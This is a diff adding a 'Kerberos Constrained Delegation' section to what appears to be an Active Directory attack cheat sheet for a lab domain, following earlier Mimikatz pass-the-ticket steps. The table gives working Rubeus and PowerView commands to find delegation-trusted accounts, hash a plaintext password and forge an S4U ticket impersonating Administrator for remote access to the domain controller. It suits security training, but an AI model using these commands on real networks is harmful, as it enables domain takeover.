@@ -43,3 +43,13 @@
 #### 13) kerberos::ptt TICKET2.KIRBI
 
 #### 14) klist
+
+# Kerberos Constrained Delegation
+
+| Command                                                      | Description                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `Get-NetUser -TrustedToAuth`                                 | Cmdlet used to enumerate user accounts that are trusted for delegation in the domain |
+| `.\Rubeus.exe hash /password:Slavi123`                       | Converts the plaintext password `Slavi123` to its NTLM hash equivalent|
+| `.\Rubeus.exe s4u /user:webservice /rc4:<hash> /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt` | Using Rubeus to request a ticket for the `Administrator` account, by way of the `webservice` user who is trusted for delegation |
+| `Enter-PSSession dc1`                                        | Used to enter a new powershell remote session on the `dc1` computer |
+
